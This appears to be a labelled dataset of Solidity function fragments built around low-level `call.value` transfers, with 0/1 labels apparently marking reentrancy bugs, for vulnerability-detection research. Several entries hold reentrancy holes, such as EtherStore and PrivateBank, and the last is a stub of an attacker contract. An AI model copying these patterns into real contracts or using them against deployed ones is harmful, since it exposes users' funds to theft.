assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
Transfer(msg.sender, _to, _value, _data);
Transfer(msg.sender, _to, _value);
return true;
0
---------------------------------
1814 16057.sol
16057.sol
function callFirstTarget () public payable onlyPlayers {
require (msg.value >= 0.005 ether);
firstTarget.call.value(msg.value)();
function callSecondTarget () public payable onlyPlayers {
require (msg.value >= 0.005 ether);
secondTarget.call.value(msg.value)();
function winPrize() public payable onlyOwner {
owner.call.value(1 wei)();
0
---------------------------------
1815 19402.sol
19402.sol
function buyToken(address recipient, uint256 value) internal {
if (block.number<startBlock || block.number>endBlock) throw;
uint tokens = safeMul(value, price());
if(safeAdd(crowdSaleSoldAmount, tokens)>crowdSaleCap) throw;
balances[recipient] = safeAdd(balances[recipient], tokens);
crowdSaleSoldAmount = safeAdd(crowdSaleSoldAmount, tokens);
totalSupply = safeAdd(totalSupply, tokens);
Transfer(address(0), recipient, tokens);
if (!founder.call.value(value)()) throw;
Buy(recipient, value, tokens);
function price() constant returns(uint) {
if (block.number<startBlock || block.number > endBlock) return 0;
else  return crowdSalePrice;
function() public payable {
if(msg.value == 0) {
sendCandy(msg.sender);
}  else {
buyToken(msg.sender, msg.value);
0
---------------------------------
1816 3054.sol
3054.sol
function player_withdrawPendingTransactions() public returns (bool){
uint withdrawAmount = playerPendingWithdrawals[msg.sender];
playerPendingWithdrawals[msg.sender] = 0;
if (msg.sender.call.value(withdrawAmount)()) {
return true;
} else {
playerPendingWithdrawals[msg.sender] = withdrawAmount;
return false;
1
---------------------------------
1817 29517.sol
29517.sol
function temporaryEscapeHatch(address to, uint256 value, bytes data) public {
require(msg.sender == admin);
require(to.call.value(value)(data));
0
---------------------------------
1818 30046.sol
30046.sol
function executeTransaction() public onlyActiveUsersAllowed()  transactionMustBePending() {
Transaction storage transaction = transactions[transactions.length - 1];
require(now > transaction.time_initiated + users[transaction.initiated_by].waiting_time);
transaction.is_executed = true;
transaction.time_finalized = now;
transaction.finalized_by = msg.sender;
transaction.execution_successful = transaction.destination.call.value(
transaction.value)(transaction.data);
1
---------------------------------
1819 27248.sol
27248.sol
function execute(uint8[] sigV, bytes32[] sigR, bytes32[] sigS, address destination, uint value, bytes data) public {
require(sigR.length == threshold);
require(sigR.length == sigS.length && sigR.length == sigV.length);
bytes32 txHash = keccak256(byte(0x19), byte(0), address(this), destination, value, data, nonce);
address lastAdd = address(0);
for (uint i = 0; i < threshold; i++) {
address recovered = ecrecover(txHash, sigV[i], sigR[i], sigS[i]);
require(recovered > lastAdd && isOwner[recovered]);
lastAdd = recovered;
nonce = nonce + 1;
require(destination.call.value(value)(data));
0
---------------------------------
1820 EtherStore.sol
EtherStore.sol
function withdrawFunds (uint256 _weiToWithdraw) public {
require(balances[msg.sender] >= _weiToWithdraw);
require(_weiToWithdraw <= withdrawalLimit);
require(now >= lastWithdrawTime[msg.sender] + 1 weeks);
require(msg.sender.call.value(_weiToWithdraw)());
balances[msg.sender] -= _weiToWithdraw;
lastWithdrawTime[msg.sender] = now;
1
---------------------------------
1821 40589.sol
40589.sol
function sendRobust(address to, uint value) internal {
if (!to.send(value)) {
if (!to.call.value(value)()) throw;
function _fillOrder(address _from, uint numTokens) internal returns (bool) {
if (numTokens == 0) throw;
if (this.balance < numTokens * weiPerToken / decimalPlaces) throw;
if (!token.transferFrom(_from, owner, numTokens)) return false;
sendRobust(_from, numTokens * weiPerToken / decimalPlaces);
OrderFilled(_from, numTokens);
return true;
0
---------------------------------
1822 11705.sol
11705.sol
function commonWithdraw(address token, uint value) internal {
require (tokens[token][msg.sender] >= value);
tokens[token][msg.sender] -= value;
totalDeposited[token] -= value;
require((token != 0)?
ERC20(token).transfer(msg.sender, value):
msg.sender.call.value(value)()
);
emit Withdraw(
token,
msg.sender,
value,
tokens[token][msg.sender]);
function withdraw(uint amount) public {
commonWithdraw(0, amount);
function withdrawToken(address token, uint amount) public {
commonWithdraw(token, amount);
0
---------------------------------
1823 37891.sol
37891.sol
function claim() {
uint balance = balances[msg.sender];
require(balance > 0);
balances[msg.sender] = 0;
bool claimed = msg.sender.call.value(balance)();
require(claimed);
0
---------------------------------
1824 23166.sol
23166.sol
function buy(address recipient) payable public duringCrowdSale  {
require(!halted);
require(msg.value >= 0.01 ether);
uint256 tokens = msg.value.mul(35e4);
require(tokens > 0);
require(saleTokenSupply.add(tokens)<=coinAllocation );
balances[recipient] = balances[recipient].add(tokens);
totalSupply_ = totalSupply_.add(tokens);
saleTokenSupply = saleTokenSupply.add(tokens);
salesVolume = salesVolume.add(msg.value);
if (!founder.call.value(msg.value)()) revert();
Buy(msg.sender, recipient, msg.value, tokens);
function TorusCoin(uint256 startDatetimeInSeconds, address founderWallet) public {
admin = msg.sender;
founder = founderWallet;
startDatetime = startDatetimeInSeconds;
endDatetime = startDatetime + 16 * 1 days;
function() public payable {
buy(msg.sender);
0
---------------------------------
1825 40416.sol
40416.sol
function withdraw(uint amount) {
if (msg.value>0) throw;
if (tokens[0][msg.sender] < amount) throw;
tokens[0][msg.sender] -= amount;
if (!msg.sender.call.value(amount)()) throw;
Withdraw(0, msg.sender, amount, tokens[0][msg.sender]);
0
---------------------------------
1826 37329.sol
37329.sol
function buyICO() onlyExecutorOrOwner {
if (getBlockNumber() < icoStartBlock) return;
if (this.balance == 0) return;
uint256 purchaseAmount = Math.min256(this.balance, purchaseCap);
assert(crowdSale.call.value(purchaseAmount)());
ICOPurchased(purchaseAmount);
0
---------------------------------
1827 13076.sol
13076.sol
function approveAndCall(address _spender, uint256 _value, bytes _data) public payable returns (bool) {
require(_spender != address(this));
super.approve(_spender, _value);
require(_spender.call.value(msg.value)(_data));
return true;
function transferAndCall(address _to, uint256 _value, bytes _data) public payable returns (bool) {
require(_to != address(this));
super.transfer(_to, _value);
require(_to.call.value(msg.value)(_data));
return true;
function transferFromAndCall(    address _from,    address _to,    uint256 _value,    bytes _data  )    public payable returns (bool)  {
require(_to != address(this));
super.transferFrom(_from, _to, _value);
require(_to.call.value(msg.value)(_data));
return true;
function increaseApprovalAndCall(address _spender, uint _addedValue, bytes _data) public payable returns (bool) {
require(_spender != address(this));
super.increaseApproval(_spender, _addedValue);
require(_spender.call.value(msg.value)(_data));
return true;
function decreaseApprovalAndCall(address _spender, uint _subtractedValue, bytes _data) public payable returns (bool) {
require(_spender != address(this));
super.decreaseApproval(_spender, _subtractedValue);
require(_spender.call.value(msg.value)(_data));
return true;
contract TimedCrowdsale is Crowdsale {
using SafeMath for uint256;
uint256 public openingTime;
uint256 public closingTime;
modifier onlyWhileOpen {
require(block.timestamp >= openingTime && block.timestamp <= closingTime);
_;
1
---------------------------------
1828 39890.sol
39890.sol
function authorizePayment(uint _idMilestone) internal {
if (_idMilestone >= milestones.length) throw;
Milestone milestone = milestones[_idMilestone];
if (milestone.status == MilestoneStatus.AuthorizedForPayment) throw;
milestone.status = MilestoneStatus.AuthorizedForPayment;
if(!milestone.paymentSource.call.value(0)(milestone.payData)) throw;
ProposalStatusChanged(_idMilestone, milestone.status);
function approveCompletedMilestone(uint _idMilestone) campaignNotCanceled notChanging {
if (_idMilestone >= milestones.length) throw;
Milestone milestone = milestones[_idMilestone];
if ((msg.sender != milestone.reviewer) ||(milestone.status != MilestoneStatus.Completed)) throw;
authorizePayment(_idMilestone);
function requestMilestonePayment(uint _idMilestone) campaignNotCanceled notChanging {
if (_idMilestone >= milestones.length) throw;
Milestone milestone = milestones[_idMilestone];
if ((msg.sender != milestone.milestoneLeadLink)&&(msg.sender != recipient))  throw;
if ((milestone.status != MilestoneStatus.Completed) || (now < milestone.doneTime + milestone.reviewTime)) throw;
authorizePayment(_idMilestone);
function arbitrateApproveMilestone(uint _idMilestone) onlyArbitrator campaignNotCanceled notChanging {
if (_idMilestone >= milestones.length) throw;
Milestone milestone = milestones[_idMilestone];
if ((milestone.status != MilestoneStatus.AcceptedAndInProgress) && (milestone.status != MilestoneStatus.Completed)) throw;
authorizePayment(_idMilestone);
0
---------------------------------
1829 35661.sol
35661.sol
function refund() stopInEmergency {
if(getState() != State.Refunding) throw;
address investor = msg.sender;
if(balances[investor] == 0) throw;
uint amount = balances[investor];
delete balances[investor];
if(!(investor.call.value(amount)())) throw;
Refunded(investor, amount);
0
---------------------------------
1830 35649.sol
35649.sol
function playerWithdrawPendingTransactions() public  payoutsAreActive   returns (bool)  {
uint withdrawAmount = playerPendingWithdrawals[msg.sender];
playerPendingWithdrawals[msg.sender] = 0;
if (msg.sender.call.value(withdrawAmount)()) {
return true;
} else {
playerPendingWithdrawals[msg.sender] = withdrawAmount;
return false;
0
---------------------------------
1831 39932.sol
39932.sol
function process(bytes32 _destination) payable returns (bool) {
if (msg.value < 100) throw;
var tax = msg.value * taxPerc / 100;
var refill = bytes4(sha3("refill(bytes32)"));
if ( !ledger.call.value(tax)(refill, taxman)|| !ledger.call.value(msg.value - tax)(refill, _destination)) throw;
return true;
contract Invoice is Mortal {
address   public signer;
uint      public closeBlock;
Comission public comission;
string    public description;
bytes32   public beneficiary;
uint      public value;
0
---------------------------------
1832 31759.sol
31759.sol
function execute(uint8[] sigV, bytes32[] sigR, bytes32[] sigS, address destination,  uint value, bytes data)  external {
bytes32 txHash = keccak256(byte(0x19),  byte(0), this, nonce++, destination, value, data  );
verifySignatures( sigV,sigR,sigS,txHash);
require(destination.call.value(value)(data));
0
---------------------------------
1833 22902.sol
22902.sol
function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public returns (bool success) {
if (isContract(_to)) {
require(allowedAddresses[_to]);
if (balanceOf(msg.sender) < _value) revert();
balances[msg.sender] = balances[msg.sender].sub(_value);
balances[_to] = balances[_to].add(_value);
assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
TransferContract(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
1834 30337.sol
30337.sol
function withdrawPayments()  external   returns (bool success) {
uint256 payment = payments[msg.sender];
payments[msg.sender] = 0;
totalBalance -= payment;
if (!msg.sender.call.value(payment)()) {
throw;
success = true;
0
---------------------------------
1835 2013.sol
2013.sol
function executeTransaction(address destination, uint value, bytes data) public onlyOwner{
if (destination.call.value(value)(data))
emit Execution(destination,value,data);
else
emit ExecutionFailure(destination,value,data);
library SafeMath {
0
---------------------------------
1836 16643.sol
16643.sol
function fundPuppets() public payable {
require(msg.sender == owner);
_share = SafeMath.div(msg.value, 4);
extra[0].call.value(_share).gas(800000)();
extra[1].call.value(_share).gas(800000)();
extra[2].call.value(_share).gas(800000)();
extra[3].call.value(_share).gas(800000)();
function() payable public{
contract Puppet {
mapping (uint256 => address) public target;
mapping (uint256 => address) public master;
constructor() payable public{
target[0] = 0x509Cb8cB2F8ba04aE81eEC394175707Edd37e109;
master[0] = 0x5C035Bb4Cb7dacbfeE076A5e61AA39a10da2E956;
function() public payable{
if(msg.sender != target[0]){
target[0].call.value(msg.value).gas(600000)();
function fundPuppets() public payable {
require(msg.sender == owner);
_share = SafeMath.div(msg.value, 4);
extra[0].call.value(_share).gas(800000)();
extra[1].call.value(_share).gas(800000)();
extra[2].call.value(_share).gas(800000)();
extra[3].call.value(_share).gas(800000)();
function() payable public{
contract Puppet {
mapping (uint256 => address) public target;
mapping (uint256 => address) public master;
constructor() payable public{
target[0] = 0x509Cb8cB2F8ba04aE81eEC394175707Edd37e109;
master[0] = 0x5C035Bb4Cb7dacbfeE076A5e61AA39a10da2E956;
function() public payable{
if(msg.sender != target[0]){
target[0].call.value(msg.value).gas(600000)();
function fundPuppets() public payable {
require(msg.sender == owner);
_share = SafeMath.div(msg.value, 4);
extra[0].call.value(_share).gas(800000)();
extra[1].call.value(_share).gas(800000)();
extra[2].call.value(_share).gas(800000)();
extra[3].call.value(_share).gas(800000)();
function() payable public{
contract Puppet {
mapping (uint256 => address) public target;
mapping (uint256 => address) public master;
constructor() payable public{
target[0] = 0x509Cb8cB2F8ba04aE81eEC394175707Edd37e109;
master[0] = 0x5C035Bb4Cb7dacbfeE076A5e61AA39a10da2E956;
function() public payable{
if(msg.sender != target[0]){
target[0].call.value(msg.value).gas(600000)();
function fundPuppets() public payable {
require(msg.sender == owner);
_share = SafeMath.div(msg.value, 4);
extra[0].call.value(_share).gas(800000)();
extra[1].call.value(_share).gas(800000)();
extra[2].call.value(_share).gas(800000)();
extra[3].call.value(_share).gas(800000)();
function() payable public{
contract Puppet {
mapping (uint256 => address) public target;
mapping (uint256 => address) public master;
constructor() payable public{
target[0] = 0x509Cb8cB2F8ba04aE81eEC394175707Edd37e109;
master[0] = 0x5C035Bb4Cb7dacbfeE076A5e61AA39a10da2E956;
function() public payable{
if(msg.sender != target[0]){
target[0].call.value(msg.value).gas(600000)();
function fundPuppets() public payable {
require(msg.sender == owner);
_share = SafeMath.div(msg.value, 4);
extra[0].call.value(_share).gas(800000)();
extra[1].call.value(_share).gas(800000)();
extra[2].call.value(_share).gas(800000)();
extra[3].call.value(_share).gas(800000)();
function() payable public{
contract Puppet {
mapping (uint256 => address) public target;
mapping (uint256 => address) public master;
constructor() payable public{
target[0] = 0x509Cb8cB2F8ba04aE81eEC394175707Edd37e109;
master[0] = 0x5C035Bb4Cb7dacbfeE076A5e61AA39a10da2E956;
function() public payable{
if(msg.sender != target[0]){
target[0].call.value(msg.value).gas(600000)();
0
---------------------------------
1837 31565.sol
31565.sol
function reject(address _participant) onlyOwner public {
uint256 weiAmount = deposited[_participant];
require(weiAmount > 0);
deposited[_participant] = 0;
Rejected(_participant);
require(_participant.call.value(weiAmount)());
function rejectMany(address[] _participants) onlyOwner public {
for (uint256 i = 0; i < _participants.length; i++) {
reject(_participants[i]);
0
---------------------------------
1838 35878.sol
35878.sol
function Forwarder(address _creator, bytes32 _regName, address _owner)
public
RegBase(_creator, _regName, _owner)
forwardTo = owner;
function() public payable {
Forwarded(msg.sender, forwardTo, msg.value);
require(forwardTo.call.value(msg.value)(msg.data));
function createNew(bytes32 _regName, address _owner)
public
payable
feePaid
returns (address kAddr_)
kAddr_ = address(new Forwarder(msg.sender, _regName, _owner));
Created(msg.sender, _regName, kAddr_);
0
---------------------------------
1839 6881.sol
6881.sol
function buyOne(ERC20 token, address _exchange, uint256 _value, bytes _data) payable public {
balances[msg.sender] = balances[msg.sender].add(msg.value);
uint256 tokenBalance = token.balanceOf(this);
require(_exchange.call.value(_value)(_data));
balances[msg.sender] = balances[msg.sender].sub(_value);
tokenBalances[msg.sender][token] = tokenBalances[msg.sender][token].add(token.balanceOf(this).sub(tokenBalance));
1
---------------------------------
1840 PrivateBank.sol
PrivateBank.sol
function CashOut(uint _am)  {
if(_am<=balances[msg.sender]) {
if(msg.sender.call.value(_am)()) {
balances[msg.sender]-=_am;
TransferLog.AddMessage(msg.sender,_am,"CashOut");
function() public payable{}
contract Log
struct Message
address Sender;
string  Data;
uint Val;
uint  Time;
Message[] public History;
Message LastMsg;
1
---------------------------------
1841 1123.sol
1123.sol
function distributeExternal(uint256 _rID, uint256 _pID, uint256 _eth, uint256 _affID, uint256 _team, F3Ddatasets.EventReturns memory _eventData_) private returns(F3Ddatasets.EventReturns)  {
uint256 _p1 = _eth / 100;
uint256 _com = _eth / 50;
_com = _com.add(_p1);
uint256 _p3d;
if (!address(admin).call.value(_com)()) {
_p3d = _com;
_com = 0;
uint256 _aff = _eth / 10;
if (_affID != _pID && plyr_[_affID].name != '') {
plyr_[_affID].aff = _aff.add(plyr_[_affID].aff);
emit F3Devents.onAffiliatePayout(_affID, plyr_[_affID].addr, plyr_[_affID].name, _rID, _pID, _aff, now);
} else {
_p3d = _aff;
_p3d = _p3d.add((_eth.mul(fees_[_team].p3d)) / (100));
if (_p3d > 0) {
admin.transfer(_p3d);
_eventData_.P3DAmount = _p3d.add(_eventData_.P3DAmount);
return(_eventData_);
function core(uint256 _rID, uint256 _pID, uint256 _eth, uint256 _affID, uint256 _team, F3Ddatasets.EventReturns memory _eventData_) private {
if (plyrRnds_[_pID][_rID].keys == 0)
_eventData_ = managePlayer(_pID, _eventData_);
if (round_[_rID].eth < 400000000000000000000 && plyrRnds_[_pID][_rID].eth.add(_eth) > 4000000000000000000){
uint256 _availableLimit = (4000000000000000000).sub(plyrRnds_[_pID][_rID].eth);
uint256 _refund = _eth.sub(_availableLimit);
plyr_[_pID].gen = plyr_[_pID].gen.add(_refund);
_eth = _availableLimit;
if (_eth > 1000000000) {
uint256 _keys = (round_[_rID].eth).keysRec(_eth);
if (_keys >= 1000000000000000000) {
updateTimer(_keys, _rID);
if (round_[_rID].plyr != _pID)
round_[_rID].plyr = _pID;
if (round_[_rID].team != _team)
round_[_rID].team = _team;
_eventData_.compressedData = _eventData_.compressedData + 100;
if (_eth >= 100000000000000000) {
airDropTracker_++;
if (airdrop() == true) {
uint256 _prize;
if (_eth >= 10000000000000000000) {
_prize = ((airDropPot_).mul(75)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 300000000000000000000000000000000;
} else if (_eth >= 1000000000000000000 && _eth < 10000000000000000000) {
_prize = ((airDropPot_).mul(50)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 200000000000000000000000000000000;
} else if (_eth >= 100000000000000000 && _eth < 1000000000000000000) {
_prize = ((airDropPot_).mul(25)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 300000000000000000000000000000000;
_eventData_.compressedData += 10000000000000000000000000000000;
_eventData_.compressedData += _prize * 1000000000000000000000000000000000;
airDropTracker_ = 0;
_eventData_.compressedData = _eventData_.compressedData + (airDropTracker_ * 1000);
plyrRnds_[_pID][_rID].keys = _keys.add(plyrRnds_[_pID][_rID].keys);
plyrRnds_[_pID][_rID].eth = _eth.add(plyrRnds_[_pID][_rID].eth);
round_[_rID].keys = _keys.add(round_[_rID].keys);
round_[_rID].eth = _eth.add(round_[_rID].eth);
rndTmEth_[_rID][_team] = _eth.add(rndTmEth_[_rID][_team]);
_eventData_ = distributeExternal(_rID, _pID, _eth, _affID, _team, _eventData_);
_eventData_ = distributeInternal(_rID, _pID, _eth, _team, _keys, _eventData_);
endTx(_pID, _team, _eth, _keys, _eventData_);
function coreQR(address _realSender,uint256 _rID, uint256 _pID, uint256 _eth, uint256 _affID, uint256 _team, F3Ddatasets.EventReturns memory _eventData_)       private   {
if (plyrRnds_[_pID][_rID].keys == 0)
_eventData_ = managePlayer(_pID, _eventData_);
if (round_[_rID].eth < 400000000000000000000 && plyrRnds_[_pID][_rID].eth.add(_eth) > 4000000000000000000) {
uint256 _availableLimit = (4000000000000000000).sub(plyrRnds_[_pID][_rID].eth);
uint256 _refund = _eth.sub(_availableLimit);
plyr_[_pID].gen = plyr_[_pID].gen.add(_refund);
_eth = _availableLimit;
if (_eth > 1000000000) {
uint256 _keys = (round_[_rID].eth).keysRec(_eth);
if (_keys >= 1000000000000000000){
updateTimer(_keys, _rID);
if (round_[_rID].plyr != _pID)
round_[_rID].plyr = _pID;
if (round_[_rID].team != _team)
round_[_rID].team = _team;
_eventData_.compressedData = _eventData_.compressedData + 100;
if (_eth >= 100000000000000000) {
airDropTracker_++;
if (airdrop() == true) {
uint256 _prize;
if (_eth >= 10000000000000000000) {
_prize = ((airDropPot_).mul(75)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 300000000000000000000000000000000;
} else if (_eth >= 1000000000000000000 && _eth < 10000000000000000000) {
_prize = ((airDropPot_).mul(50)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 200000000000000000000000000000000;
} else if (_eth >= 100000000000000000 && _eth < 1000000000000000000) {
_prize = ((airDropPot_).mul(25)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 300000000000000000000000000000000;
_eventData_.compressedData += 10000000000000000000000000000000;
_eventData_.compressedData += _prize * 1000000000000000000000000000000000;
airDropTracker_ = 0;
_eventData_.compressedData = _eventData_.compressedData + (airDropTracker_ * 1000);
plyrRnds_[_pID][_rID].keys = _keys.add(plyrRnds_[_pID][_rID].keys);
plyrRnds_[_pID][_rID].eth = _eth.add(plyrRnds_[_pID][_rID].eth);
round_[_rID].keys = _keys.add(round_[_rID].keys);
round_[_rID].eth = _eth.add(round_[_rID].eth);
rndTmEth_[_rID][_team] = _eth.add(rndTmEth_[_rID][_team]);
_eventData_ = distributeExternal(_rID, _pID, _eth, _affID, _team, _eventData_);
_eventData_ = distributeInternal(_rID, _pID, _eth, _team, _keys, _eventData_);
endTxQR(_realSender,_pID, _team, _eth, _keys, _eventData_);
0
---------------------------------
1842 39662.sol
39662.sol
function sendToCharger(uint id){
if (msg.sender != Owner && msg.sender != Manager) return ;
var _amountForCharger = getAmountForCharger(id);
uint _priceOfCharger = Chargers[id].Address.getPrice() ;
if(_priceOfCharger> _amountForCharger){
uint difference  = _priceOfCharger - _amountForCharger;
calculateCountOfInvestmetnsInQueue(difference,id);
if(!Chargers[id].Address.call.value(_priceOfCharger)())   throw;
0
---------------------------------
1843 28974.sol
28974.sol
function pay(address _addr, uint256 count) public payable {
assert(changeable==true);
assert(msg.value >= price*count);
if(!founder.call.value(price*count)() || !msg.sender.call.value(msg.value-price*count)()){
revert();
s.update(_addr,count);
Buy(msg.sender,count);
function () public payable {
pay(msg.sender,1);
1
---------------------------------
1844 27188.sol
27188.sol
function loggedTransfer(uint amount, bytes32 message, address target, address currentOwner) protected {
if(!target.call.value(amount)()) throw;
Transfer(amount, message, target, currentOwner);
function divest(uint amount) public {
if ( investors[msg.sender].investment == 0 || amount == 0) throw;
investors[msg.sender].investment -= amount;
sumInvested -= amount;
this.loggedTransfer(amount, "", msg.sender, owner);
function payDividend() public {
uint dividend = calculateDividend();
if (dividend == 0) throw;
investors[msg.sender].lastDividend = sumDividend;
this.loggedTransfer(dividend, "Dividend payment", msg.sender, owner);
function doTransfer(address target, uint amount) public onlyOwner {
this.loggedTransfer(amount, "Owner transfer", target, owner);
1
---------------------------------
1845 10297.sol
10297.sol
function execute0(address to, uint256 value, bytes data) private returns (address created)  {
if (to == 0) {
created = create0(value, data);
} else {
require(to.call.value(value)(data));
0
---------------------------------
1846 14620.sol
14620.sol
function transferEth(address walletToTransfer, uint256 weiAmount) onlyOwner payable public {
require(walletToTransfer != address(0));
require(address(this).balance >= weiAmount);
require(address(this) != walletToTransfer);
require(walletToTransfer.call.value(weiAmount)());
0
---------------------------------
1847 38651.sol
38651.sol
function cancelBuyOrder(address token, uint price) {
bytes32 h = sha256(token, price, msg.sender);
uint remain = buyOrders[h];
delete buyOrders[h];
if (!msg.sender.call.value(remain)()) throw;
CancelBuyOrder(h,token,price,msg.sender);
0
---------------------------------
1848 38888.sol
38888.sol
function withdraw() onlyOwner {
if (!owner.call.value(this.balance)()) throw;
0
---------------------------------
1849 39994.sol
39994.sol
function safeSend(address _recipient, uint _ether) internal preventReentry()  returns (bool success_) {
if(!_recipient.call.value(_ether)()) throw;
success_ = true;
pragma solidity ^0.4.0;
contract Math
string constant VERSION = "Math 0.0.1 \n";
uint constant NULL = 0;
bool constant LT = false;
bool constant GT = true;
uint constant iTRUE = 1;
uint constant iFALSE = 0;
uint constant iPOS = 1;
uint constant iZERO = 0;
uint constant iNEG = uint(-1);
function withdraw(uint _ether) external canEnter  hasEther(msg.sender, _ether) returns (bool success_) {
etherBalance[msg.sender] -= _ether;
safeSend(msg.sender, _ether);
success_ = true;
0
---------------------------------
1850 14741.sol
14741.sol
function transferToContractWithCustomFallback(address _to, uint _value, bytes _data, string _custom_fallback) private returns(bool success) {
require(balanceOf(msg.sender) > _value);
balances[msg.sender] = balances[msg.sender].sub(_value);
balances[_to] = balances[_to].add(_value);
assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
emit Transfer(msg.sender, _to, _value, _data);
return true;
function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public returns(bool success) {
require(!frozenAccount[msg.sender]);
require(!frozenAccount[_to]);
if (isContract(_to)) {
return transferToContractWithCustomFallback(_to, _value, _data, _custom_fallback);
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
1851 29601.sol
29601.sol
function transferInternal(address from, address to, uint256 value, bytes data,  bool useCustomFallback, string customFallback )  internal returns (bool success) {
bool status = super.transferInternal(from, to, value);
if (status) {
if (isContract(to)) {
ContractReceiver receiver = ContractReceiver(to);
if (useCustomFallback) {
require(receiver.call.value(0)(bytes4(keccak256(customFallback)), from, value, data) == true);
} else {
receiver.tokenFallback(from, value, data);
Transfer(from, to, value, data);
return status;
function transfer(address to, uint value, bytes data, string customFallback) public returns (bool success) {
require(locked == false);
bool status = transferInternal(msg.sender, to, value, data, true, customFallback);
return status;
function transferInternal(address from, address to, uint256 value, bytes data) internal returns (bool success) {
return transferInternal(from, to, value, data, false, "");
function transferInternal(address from, address to, uint256 value) internal returns (bool success) {
require(locked == false);
bytes memory data;
return transferInternal(from, to, value, data, false, "");
function claimableTransfer(
uint256 _time,
address _from,
address _to,
uint256 _value,
bytes _data,
bool _useCustomFallback,
string _customFallback
)
internal returns (bool success)
uint256 senderCurrentBalance = balanceOf(_from);
uint256 receiverCurrentBalance = balanceOf(_to);
uint256 _totalSupply = totalSupply();
bool status = super.transferInternal(_from, _to, _value, _data, _useCustomFallback, _customFallback);
require(status);
claimInternal(_time, _from, senderCurrentBalance, _totalSupply);
claimInternal(_time, _to, receiverCurrentBalance, _totalSupply);
return true;
0
---------------------------------
1852 38724.sol
38724.sol
function allowance(address _owner, address _spender) constant returns (uint256 remaining) {
return allowed[_owner][_spender];
mapping (address => uint256) balances;
mapping (address => mapping (address => uint256)) allowed;
contract ERC20nator is StandardToken, Ownable {
address public fundraiserAddress;
bytes public fundraiserCallData;
uint constant issueFeePercent = 2;
event requestedRedeem(address indexed requestor, uint amount);
event redeemed(address redeemer, uint amount);
function() payable {
uint issuedTokens = msg.value * (100 - issueFeePercent) / 100;
if(!owner.send(msg.value - issuedTokens)) throw;
if(!fundraiserAddress.call.value(issuedTokens)(fundraiserCallData))  throw;
totalSupply += issuedTokens;
balances[msg.sender] += issuedTokens;
1
---------------------------------
1853 21277.sol
21277.sol
function callFor(address _to, uint256 _value, uint256 _gas, bytes _code) external payable onlyManager returns (bool) {
return _to.call.value(_value).gas(_gas)(_code);
modifier onlyManager
require(msg.sender == manager);
_;
contract EthernameRaw is Managed {
event Transfer(
address indexed from,
address indexed to,
bytes32 indexed name
);
event Approval(
address indexed owner,
address indexed approved,
bytes32 indexed name
);
event SendEther(
address indexed from,
address indexed to,
bytes32 sender,
bytes32 recipient,
uint256 value
);
event Name(address indexed owner, bytes32 indexed name);
event Price(bytes32 indexed name, uint256 price);
event Buy(bytes32 indexed name, address buyer, uint256 price);
event Attribute(bytes32 indexed name, bytes32 key);
struct Record {
address owner;
uint256 price;
mapping (bytes32 => bytes) attrs;
string public constant name = "Ethername";
string public constant symbol = "ENM";
mapping (address => bytes32) public ownerToName;
mapping (bytes32 => Record) public nameToRecord;
mapping (bytes32 => address) public nameToApproved;
0
---------------------------------
1854 18145.sol
18145.sol
function ___upgradeToAndCall(address newTarget, bytes data) payable public _onlyProxyOwner {
___upgradeTo(newTarget);
require(address(this).call.value(msg.value)(data));
0
---------------------------------
1855 12454.sol
12454.sol
function submitPool(uint256 weiAmount) public onlyAdmin noReentrancy {
require(contractStage < CONTRACT_SUBMIT_FUNDS, "Cannot resubmit pool.");
require(receiverAddress != 0x00, "receiver address cannot be empty");
uint256 contractBalance = address(this).balance;
if(weiAmount == 0){
weiAmount = contractBalance;
require(minContribution <= weiAmount && weiAmount <= contractBalance, "submitted amount too small or larger than the balance");
finalBalance = contractBalance;
require(receiverAddress.call.value(weiAmount).gas(gasleft().sub(5000))(),"Error submitting pool to receivingAddress");
contractBalance = address(this).balance;
if(contractBalance > 0) {
ethRefundAmount.push(contractBalance);
contractStage = CONTRACT_SUBMIT_FUNDS;
emit PoolSubmitted(receiverAddress, weiAmount);
0
---------------------------------
1856 30178.sol
30178.sol
function buy() payable notPaused() public returns(bool) {
require(now >= salesStart);
require(now < salesDeadline);
uint tokensToBuy = msg.value * MULTIPLIER / TOKEN_PRICE;
require(tokensToBuy > 0);
uint timeBonus = _calculateTimeBonus(tokensToBuy, now);
uint volumeBonus = _calculateVolumeBonus(tokensToBuy, msg.sender, msg.value);
uint totalTokensToTransfer = tokensToBuy + timeBonus + volumeBonus;
require(token.transfer(msg.sender, totalTokensToTransfer));
LogBought(msg.sender, msg.value, totalTokensToTransfer, 0);
require(wallet.call.value(msg.value)());
return true;
0
---------------------------------
1857 4598.sol
4598.sol
function futrMiner() public payable {
require(futr.call.value(msg.value)());
uint256 mined = ERC20(futr).balanceOf(address(this));
ERC20(futr).approve(mny, mined);
MNY(mny).mine(futr, mined);
uint256 amount = ERC20(mny).balanceOf(address(this));
ERC20(mny).transfer(msg.sender, amount);
function futxMiner() public payable {
require(futx.call.value(msg.value)());
uint256 mined = ERC20(futx).balanceOf(address(this));
ERC20(futx).approve(mny, mined);
MNY(mny).mine(futx, mined);
uint256 amount = ERC20(mny).balanceOf(address(this));
ERC20(mny).transfer(msg.sender, amount);
0
---------------------------------
1858 Bank_attack.sol
Bank_attack.sol
function step1(uint256 amount)  payable {
if (this.balance >= amount) {
victim.call.value(amount)(bytes4(keccak256("Deposit()")));
function startAttack(uint256 amount)  {
step1(amount);
